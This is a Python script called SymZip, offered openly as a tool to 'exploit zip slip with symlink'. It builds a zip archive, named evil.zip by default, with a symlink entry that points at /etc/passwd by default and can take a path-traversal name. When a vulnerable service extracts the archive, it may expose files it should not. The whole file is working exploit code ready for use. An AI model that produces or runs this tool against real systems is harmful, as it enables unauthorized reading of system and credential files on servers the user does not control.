#!/usr/bin/env python3
# By SpawnZii

import sys, zipfile, tarfile, os, optparse, stat
from tkinter.ttk import Progressbar
import click
from alive_progress import alive_bar
import pyfiglet

@click.command()
@click.option('--symfile','-s',default="/etc/passwd",help='File to symlink, default /etc/passwd')
@click.option('--symname','-n',default="etc",help='Symlink name, example: ../../../../static/etc. Default etc')
@click.option('--zipname','-o',default="evil.zip",help='Zip file-name, default evil.zip')


def main(symfile,symname,zipname):
	"""Simple script to exploit zip slip with symlink.\n
	   Usage: python3 symzip.py --symfile /etc/passwd --symname etc --zipname evil.zip"""
	evilzip(zipname, symname, symfile)

def evilzip(output_zip_filename, link_source, link_target):
	print(f"\033[92m[+] Creating evil zip with a symlink for {link_target} file ...\033[0m")
	zipInfo  = zipfile.ZipInfo(link_source)
	zipInfo.create_system = 3 # System which created ZIP archive, 3 = Unix; 0 = Windows
	unix_st_mode = stat.S_IFLNK | stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR | stat.S_IRGRP | stat.S_IWGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IWOTH | stat.S_IXOTH
	zipInfo.external_attr = unix_st_mode << 16 
	zipOut = zipfile.ZipFile(output_zip_filename, 'w', compression=zipfile.ZIP_DEFLATED)
	zipOut.writestr(zipInfo, link_target)
	zipOut.close()
	print(f"\033[94m[-] Done, output saved has {output_zip_filename}\033[0m")

if __name__=="__main__":
	banner_one = pyfiglet.figlet_format("SymZip")
	print("\033[91m"+banner_one+"\033[0m")
	main()